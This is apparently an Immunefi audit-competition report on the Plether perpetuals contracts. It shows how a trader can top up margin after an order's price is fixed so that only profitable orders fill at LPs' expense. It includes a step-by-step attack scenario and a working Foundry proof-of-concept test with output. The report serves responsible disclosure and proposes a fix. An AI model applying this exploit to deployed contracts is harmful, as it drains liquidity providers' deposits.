# \#99832 [SC-Low] A trader adds margin after a queued order's price is fixed, so only the orders that win against LPs fill

**Submitted on Nov 15th 2026 at 12:39:00 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99832
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The project states that [binding order semantics](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L658-L659) stop traders from turning queued orders into free options. That does not hold when an order carries a leverage limit, because the trader controls the margin the limit is checked against. A trader queues an order whose leverage limit fails at its current margin, waits until the order's price is fixed and a later price is visible, and then adds margin only if the order is now a winner. A losing order fails, and the trader gets its bounty back by executing it itself. The trader keeps every favourable move and pays nothing for the others, and LPs pay out the difference.

## Vulnerability Details

An order is priced at the [first tick](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610-L614) published after the commit, called P1 here, and that price holds for as long as the order can still execute. When the trader commits, the router [queues the order](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L233-L258) without checking its limits, such as `maxPostLeverageBps`, against the account. At execution the evaluator computes the [post-trade margin](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L367) from the account's margin at that moment and tests the [leverage limit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L539) against it. A failed limit ends the order with `ConstraintViolation`.

The owner can change that margin at any time while the order waits. `CfdEngine.addMargin` checks only the caller, the amount and that a position exists, and never looks at pending orders:

[packages/perps/src/CfdEngine.sol:505-515](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L505-L515)
```solidity
if (msg.sender != account) {
    revert CfdEngine__NotAccountOwner();
}
if (amount == 0) {
    revert CfdEngine__ZeroAmount();
}

StoredPosition storage pos = _positions[account];
if (pos.lots == 0) {
    revert CfdEngine__NoOpenPosition();
}
```

So an order that fails its leverage limit at commit fills after a top-up, at the P1 price the trader already knows. Without a top-up it fails, and when the account executes the failed order itself, the router hands the bounty back to the account:

[packages/perps/src/OrderRouter.sol:336-337](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L336-L337)
```solidity
if (bountyRecipient == order.account) {
    clearinghouse.releaseReservedExecutionBountyToSource(order.account, bountyAssets);
```

One account already gets a one-sided option: it tops up only when the price moves its way. Two accounts make it two-sided. The planner [refuses an opposing open](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L314) on one account, so the trader holds a long account and a short account, queues a failing increase on each, and tops up only the side the later price favours.

### Attack scenario

The setup uses the release risk parameters from `DEPLOYMENT.md`, with 10,000,000 USDG of Junior deposits.

1. The trader holds two accounts with hedged positions: account LONG is long 500,000 USDG and account SHORT is short 500,000 USDG, each with 50,000 USDG of margin. `addMargin` needs an open position.
2. In one block, each account calls `OrderRouter.commitOrder` for a 1,000,000 USDG increase on its own side, with 5,000 USDG of margin and `maxPostLeverageBps` of 200,000 (20x). At the current margin each order would end at about 28.7x, so each would fail.
3. P1 is published one second after the commit at 1.0000 and fixes both orders' price. Two seconds later no keeper has executed the orders, and Pyth shows the basket 20 bps higher, which favours SHORT.
4. Before any keeper executes the orders, SHORT calls `CfdEngine.addMargin` with 40,000 USDG, and its order now passes at about 16x. A smart account does this and the execution in one transaction: the project's SimpleAccount accepts [`executeBatch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps-aa/SECURITY.md#L17).
5. The trader calls `OrderRouter.executeOrder` on both orders with the P1 data. SHORT's increase fills at 1.0000. LONG's fails with `ConstraintViolation`, and its bounty and margin go back to LONG.
6. SHORT commits a close of the 1,000,000 USDG, which a keeper fills at the next tick, 1.0020.
7. LPs lose 1,500 USDG of value. The trader's two accounts gain 949 USDG, and the treasury takes 550 USDG in fees. If the later tick is 20 bps lower instead, LONG tops up and the trader gains 1,117 USDG. If it shows no move, the trader adds no margin, both orders fail, and its balances do not change.

## Impact Details

Direct theft of user funds. The trader takes LP deposits: after the order's price is fixed and a later price is visible, it makes the winning order fill and lets the losing one fail for free. In the test, a 20 bps move on two 1,000,000 USDG orders costs LPs 1,500 USDG, and the trader nets 949 USDG.

LPs lose deposited USDG, and the loss is final: the trader's profit is paid out of the pool's cash and taken through an ordinary close. Every time the trader uses the option, LPs pay the move between P1 and the trader's decision, and an option the trader does not use costs it nothing. The trader can repeat this with each order pair, up to 5 pending orders per account.

Conditions:
- The trader's top-up and execution must land after a later tick is visible and before any keeper executes the order at P1. Keepers learn P1 at the same time as the trader, and `DEPLOYMENT.md` tells them to [service the head](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L359) of the queue regardless of reward. The trader wins when keepers are slower than the next tick, or when it pays for priority. Nothing in the contracts limits the delay: P1 stays valid until the order's deadline, at most `maxExecutionWindowSeconds` after the commit, 60 seconds by default. If a keeper goes first, both orders fail and the trader loses two open bounties of at most 0.20 USDG each, 0.40 USDG in the test.
- At each start of the Friday close-only window, the trader can remove the race for closes. A close carries the same option through its `minPostPositionEquityAssets` limit, which also uses the margin at execution. The known low "A close-only-ineligible open at the FIFO head blocks all later risk-reducing closes" lets a second account commit an open one second before the window and hold the queue head until its deadline. No keeper can execute the trader's close for about 58 seconds while the trader watches the price, and the close can still fill at its P1 after the open expires. The second test runs this: the keeper's execution of the head returns `CloseOnly`, the closes cannot be executed behind it, the trader adds margin 57 seconds after P1, one second before the open expires and while still nobody can execute, and whoever executes afterwards, a keeper in the test, fills only LONG's close at 1.0000. With a 40 bps move the trader gains 1,948 USDG and LPs lose 2,750 USDG.
- On 1,000,000 USDG orders, the move must exceed about 11 bps to pay the two 4 bps execution fees, the price-impact charge and carry. The close variant in the second test needs about 21 bps.
- Size is limited by the 40% skew cap of the pool and by the margin the trader can add.
- The scale sets severity from the end state, and the race only lowers the reward.

The finding shows that the fix of SC-M4 is incomplete. SC-M4, on page 29 of the [pre-audit report](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf), is the same free option: a hedged pair of orders whose losing leg is cancelled at no cost after the price is known. The fix pinned the price to the first tick after the commit and made failures terminal. Here the trader decides the failure itself, through its own margin, so the free cancel is back.

It is not HIGH-1, on page 219 of the [Cecuro report](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf), where a trader commits after a price is already published and is filled at it. Here P1 is published after the commit and is unknown when the trader commits; the trader learns a later price and chooses whether the order fills at P1. The project's test [`test_PublicMarginChangeReachesTerminalCapFailureAndBatchContinues`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/keeper/OrderRouterNumericDomain.t.sol#L455) shows that a margin change by the owner may make a pending order fail, but no document or known issue describes an owner choosing fill or failure after the price is fixed to take LP funds.

## Recommended Mitigation

Freeze the margin that an order's limits are checked against while the order waits: reject `addMargin` on an account that has a pending order, open or close. Alternatively, check the order's limits at commit against the account's margin and fail them at execution only if the price, not the owner, changed the result. Either way the owner can no longer decide after P1 whether a priced order fills.

## References

- [CfdEngine.sol:501-529](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L529)
- [CfdOrderPolicyEvaluatorBase.sol:367](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L367)
- [CfdOrderPolicyEvaluatorBase.sol:539](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L539)
- [OrderLiquidationBatchLogic.sol:233-258](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L233-L258)
- [OrderRouter.sol:336-337](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L336-L337)

## Proof of Concept

Both tests use the release risk parameters from `DEPLOYMENT.md` and 10,000,000 USDG of Junior deposits. Orders go through `OrderRouter.commitOrder` and `OrderRouter.executeOrder`, and the top-up through `CfdEngine.addMargin`. The first test runs the attack scenario four times from the same state: with a later tick 20 bps higher, 20 bps lower and unchanged, and once with a keeper executing both orders at P1 before the trader acts. Before the trader decides, the test moves two seconds past P1 and stores the later tick in Pyth. The orders are still executed with the P1 data, and the test checks that the winning order fills at 1.0000.

The second test repeats the option on closes at the start of the Friday close-only window. The trader's own open holds the queue head, so no keeper can go first. The trader adds margin 57 seconds after P1, one second before the open expires, and a keeper then executes the closes.

Paste the code into `test/POC.t.sol` at the repository root and run:

```bash
forge test --match-path test/POC.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {console} from "forge-std/console.sol";

contract Test is BasePerpTest {

    address internal accountLong = makeAddr("LONG"); // the trader's long account
    address internal accountShort = makeAddr("SHORT"); // the trader's short account
    address internal accountBlocker = makeAddr("BLOCKER"); // the trader's third account, used on Friday only
    address internal keeper = makeAddr("keeper");

    uint32 internal constant NO_LIMIT = type(uint32).max;
    uint256 internal constant P1 = 1e8; // the first tick after the commit, 1.0000
    uint256 internal constant WINDOW_START = 1_729_283_400; // Friday 18 Oct 2024 16:30 New York, close-only begins

    /// @dev Release risk parameters from DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function test_traderFillsOnlyTheWinningOrder() public {
        uint256 start = vm.snapshotState();

        console.log("later tick 1.0020 (20 bps up), SHORT tops up:");
        _run(1.002e8, true);
        vm.revertToState(start);

        console.log("later tick 0.9980 (20 bps down), LONG tops up:");
        _run(0.998e8, true);
        vm.revertToState(start);

        console.log("later tick 1.0000 (no move), nobody tops up:");
        _run(1e8, true);
        vm.revertToState(start);

        console.log("a keeper executes at P1 before the trader acts:");
        _run(1.002e8, false);
    }

    /// @param laterTick The price the trader sees after P1 and before it decides.
    /// @param traderFirst False if a keeper executes both orders at P1 before the trader can top up.
    function _run(
        uint256 laterTick,
        bool traderFirst
    ) internal {
        // Step 1: the trader holds hedged positions: LONG is long 500,000 USDG and SHORT is short 500,000 USDG,
        // each with 50,000 USDG of margin.
        _fundTrader(accountLong, 200_000e6);
        _fundTrader(accountShort, 200_000e6);
        uint64 baseLong = _commit(accountLong, CfdTypes.Side.LONG, 500_000e18, 50_000e6, false, NO_LIMIT);
        uint64 baseShort = _commit(accountShort, CfdTypes.Side.SHORT, 500_000e18, 50_000e6, false, NO_LIMIT);
        bytes[] memory price = _mockPythUpdateData(P1);
        vm.startPrank(keeper);
        router.executeOrder(baseLong, price);
        router.executeOrder(baseShort, price);
        vm.stopPrank();

        uint256 traderBefore = clearinghouse.balanceAssets(accountLong) + clearinghouse.balanceAssets(accountShort);
        uint256 lpValueBefore = _lpValue();
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());

        // Step 2: in one block each account commits a 1,000,000 USDG increase on its own side with 5,000 USDG of
        // margin and a 20x leverage limit. At the current margin each would end at about 28.7x and fail.
        uint64 increaseLong = _commit(accountLong, CfdTypes.Side.LONG, 1_000_000e18, 5000e6, false, 200_000);
        uint64 increaseShort = _commit(accountShort, CfdTypes.Side.SHORT, 1_000_000e18, 5000e6, false, 200_000);

        // Step 3: P1, published one second after the commit at 1.0000, fixes both orders' price.
        bytes[] memory p1 = _mockPythUpdateData(P1);

        address winner;
        if (traderFirst) {
            // Two seconds later no keeper has executed the orders, and Pyth already shows the later tick.
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(vm.getBlockTimestamp() + 2);
            baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(laterTick)), int32(-8), vm.getBlockTimestamp());

            // Step 4: the trader adds 40,000 USDG of margin only on the side the later tick favours, so only
            // that order now passes its leverage limit.
            winner = laterTick > P1 ? accountShort : laterTick < P1 ? accountLong : address(0);
            if (winner != address(0)) {
                vm.prank(winner);
                engine.addMargin(winner, 40_000e6);
            }
        }

        // Step 5: both orders are executed with the P1 data, by the trader itself or by the keeper that went
        // first. The topped-up order fills at 1.0000. The other one fails, and when the trader executes it,
        // its bounty and margin go back to the account.
        vm.prank(traderFirst ? accountLong : keeper);
        OrderV3Types.ExecutionResult memory longResult = router.executeOrder(increaseLong, p1);
        vm.prank(traderFirst ? accountShort : keeper);
        OrderV3Types.ExecutionResult memory shortResult = router.executeOrder(increaseShort, p1);
        _assertFilledOnlyFor(accountLong, winner, longResult);
        _assertFilledOnlyFor(accountShort, winner, shortResult);

        // Step 6: the winning account closes the 1,000,000 USDG increase, and a keeper fills it at the later tick.
        if (winner != address(0)) {
            CfdTypes.Side side = winner == accountLong ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT;
            uint64 close = _commit(winner, side, 1_000_000e18, 0, true, NO_LIMIT);
            bytes[] memory p2 = _mockPythUpdateData(laterTick);
            vm.prank(keeper);
            router.executeOrder(close, p2);
        }

        // Step 7: what the trader's two accounts, LPs and the treasury end up with.
        int256 traderGain = int256(clearinghouse.balanceAssets(accountLong) + clearinghouse.balanceAssets(accountShort))
            - int256(traderBefore);
        int256 lpChange = int256(_lpValue()) - int256(lpValueBefore);
        uint256 treasuryFees = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
        if (winner != address(0)) {
            console.log("  trader net gain, both accounts (USDG):", traderGain / 1e6);
            console.log("  LP value change (USDG):               ", lpChange / 1e6);
            console.log("  treasury fees (USDG):                 ", treasuryFees / 1e6);
            assertGt(traderGain, 0, "trader profits");
            assertLt(lpChange, 0, "LPs lose");
        } else {
            console.log("  trader net gain, both accounts (USDG atoms):", traderGain);
            console.log("  LP value change (USDG atoms):               ", lpChange);
            console.log("  treasury fees (USDG atoms):                 ", treasuryFees);
        }
    }

    /// @dev The same option on closes, without a race. At the start of the Friday close-only window the trader's
    ///      own open holds the queue head, so no keeper can execute the trader's closes before it expires, and the
    ///      trader decides before that.
    function test_traderFillsOnlyTheWinningOrder_fridayNoRace() public {
        uint256 laterTick = 1.004e8;

        // The trader holds LONG, long 1,500,000 USDG, and SHORT, short 1,500,000 USDG, each with 150,000 USDG
        // of margin.
        _warpTo(WINDOW_START - 100);
        _fundTrader(accountLong, 400_000e6);
        _fundTrader(accountShort, 400_000e6);
        _fundTrader(accountBlocker, 1000e6);
        uint64 baseLong = _commit(accountLong, CfdTypes.Side.LONG, 1_500_000e18, 150_000e6, false, NO_LIMIT);
        uint64 baseShort = _commit(accountShort, CfdTypes.Side.SHORT, 1_500_000e18, 150_000e6, false, NO_LIMIT);
        bytes[] memory price = _mockPythUpdateData(P1);
        vm.startPrank(keeper);
        router.executeOrder(baseLong, price);
        router.executeOrder(baseShort, price);
        vm.stopPrank();

        uint256 traderBefore = _traderBalance();
        uint256 lpValueBefore = _lpValue();
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());

        // One second before the window the third account commits a small open, which becomes the queue head.
        _warpTo(WINDOW_START - 1);
        uint64 blockerOpen = _commit(accountBlocker, CfdTypes.Side.LONG, 1000e18, 100e6, false, NO_LIMIT);

        // The window starts. A keeper executes the head with its first tick, and the open stays pending.
        bytes[] memory blockerTick = _mockPythUpdateData(P1);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(blockerOpen, blockerTick);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Pending), "head stays pending");
        assertEq(uint8(result.pendingReason), uint8(OrderV3Types.PendingReason.CloseOnly), "close-only");

        // Each account commits a close of 1,000,000 USDG with a 60,000 USDG floor on the equity that remains.
        // At the current margin about 50,000 USDG would remain, so each close would fail.
        _warpTo(WINDOW_START + 1);
        uint64 closeLong = _commit(accountLong, CfdTypes.Side.LONG, 1_000_000e18, 0, true, NO_LIMIT, 60_000e6);
        uint64 closeShort = _commit(accountShort, CfdTypes.Side.SHORT, 1_000_000e18, 0, true, NO_LIMIT, 60_000e6);

        // P1 of the closes is published one second later at 1.0000. A keeper cannot execute them behind the head.
        _warpTo(WINDOW_START + 2);
        bytes[] memory p1 = _tick(P1, WINDOW_START + 2);
        vm.prank(keeper);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotQueueHead.selector);
        router.executeOrder(closeLong, p1);

        // 57 seconds after P1 the open is one second from its expiry, so still nobody can execute the closes. Pyth
        // shows the basket 40 bps higher, which hurts LONG. LONG adds 60,000 USDG of margin, so only its close will
        // pass the floor.
        _warpTo(WINDOW_START + 59);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(laterTick)), int32(-8), vm.getBlockTimestamp());
        vm.prank(keeper);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__OrderNotQueueHead.selector);
        router.executeOrder(closeLong, p1);
        vm.prank(accountLong);
        engine.addMargin(accountLong, 60_000e6);

        // One second later the open has expired. Whoever executes now, here a keeper, removes it and executes both
        // closes with the P1 data. The outcome was decided before anyone could execute.
        _warpTo(WINDOW_START + 60);
        vm.startPrank(keeper);
        router.executeOrder(blockerOpen, p1);
        OrderV3Types.ExecutionResult memory longResult = router.executeOrder(closeLong, p1);
        OrderV3Types.ExecutionResult memory shortResult = router.executeOrder(closeShort, p1);
        vm.stopPrank();
        assertEq(uint8(longResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "LONG's close fills");
        assertEq(uint8(shortResult.status), uint8(OrderV3Types.LifecycleStatus.Failed), "SHORT's close fails");
        assertEq(engine.lastMarkPrice(), P1, "filled at P1, not at the later tick");

        // SHORT, which kept its position through the move, closes 1,000,000 USDG at the later tick.
        uint64 close = _commit(accountShort, CfdTypes.Side.SHORT, 1_000_000e18, 0, true, NO_LIMIT);
        bytes[] memory p2 = _mockPythUpdateData(laterTick);
        vm.prank(keeper);
        router.executeOrder(close, p2);

        int256 traderGain = int256(_traderBalance()) - int256(traderBefore);
        int256 lpChange = int256(_lpValue()) - int256(lpValueBefore);
        console.log("Friday close-only window, later tick 1.0040 (40 bps up), LONG tops up:");
        console.log("  trader net gain, three accounts (USDG):", traderGain / 1e6);
        console.log("  LP value change (USDG):                ", lpChange / 1e6);
        console.log(
            "  treasury fees (USDG):                  ",
            (clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore) / 1e6
        );
        assertGt(traderGain, 0, "trader profits");
        assertLt(lpChange, 0, "LPs lose");
    }

    function _traderBalance() internal view returns (uint256) {
        return clearinghouse.balanceAssets(accountLong) + clearinghouse.balanceAssets(accountShort)
            + clearinghouse.balanceAssets(accountBlocker);
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(timestamp);
    }

    /// @dev Pyth data for the unique tick published at `publishTime`.
    function _tick(
        uint256 price,
        uint256 publishTime
    ) internal returns (bytes[] memory data) {
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    /// @dev The order of `account` fills at P1 if `account` is the winner, and fails otherwise.
    function _assertFilledOnlyFor(
        address account,
        address winner,
        OrderV3Types.ExecutionResult memory result
    ) internal view {
        (uint256 size,, uint256 entryPrice,,,,) = engine.positions(account);
        if (account == winner) {
            assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "winning order fills");
            assertEq(size, 1_500_000e18, "position increased");
            assertEq(entryPrice, P1, "filled at P1, not at the later tick");
        } else {
            assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "other order fails");
            assertEq(size, 500_000e18, "position unchanged");
        }
    }

    function _lpValue() internal view returns (uint256) {
        (uint256 senior, uint256 junior) = pool.getPendingDepositTrancheState();
        return senior + junior;
    }

    /// @dev The account commits through `OrderRouter.commitOrder` with a maximum post-trade leverage.
    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint32 maxLeverageBps
    ) internal returns (uint64) {
        return _commit(account, side, size, margin, isClose, maxLeverageBps, 0);
    }

    /// @dev The same, with a minimum equity that must remain in the position after the trade.
    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint32 maxLeverageBps,
        uint256 minEquityAssets
    ) internal returns (uint64) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: minEquityAssets,
                maxPostLeverageBps: maxLeverageBps
            })
        });
        vm.prank(account);
        return router.commitOrder(request);
    }

}
```

Output:

```
Ran 2 tests for test/POC.t.sol:Test
[PASS] test_traderFillsOnlyTheWinningOrder() (gas: 36052487)
Logs:
  later tick 1.0020 (20 bps up), SHORT tops up:
    trader net gain, both accounts (USDG): 949
    LP value change (USDG):                -1500
    treasury fees (USDG):                  550
  later tick 0.9980 (20 bps down), LONG tops up:
    trader net gain, both accounts (USDG): 1117
    LP value change (USDG):                -1517
    treasury fees (USDG):                  400
  later tick 1.0000 (no move), nobody tops up:
    trader net gain, both accounts (USDG atoms): 0
    LP value change (USDG atoms):                0
    treasury fees (USDG atoms):                  0
  a keeper executes at P1 before the trader acts:
    trader net gain, both accounts (USDG atoms): -400000
    LP value change (USDG atoms):                0
    treasury fees (USDG atoms):                  0
[PASS] test_traderFillsOnlyTheWinningOrder_fridayNoRace() (gas: 11404132)
Logs:
  Friday close-only window, later tick 1.0040 (40 bps up), LONG tops up:
    trader net gain, three accounts (USDG): 1948
    LP value change (USDG):                 -2750
    treasury fees (USDG):                   801

Suite result: ok. 2 passed; 0 failed; 0 skipped
```
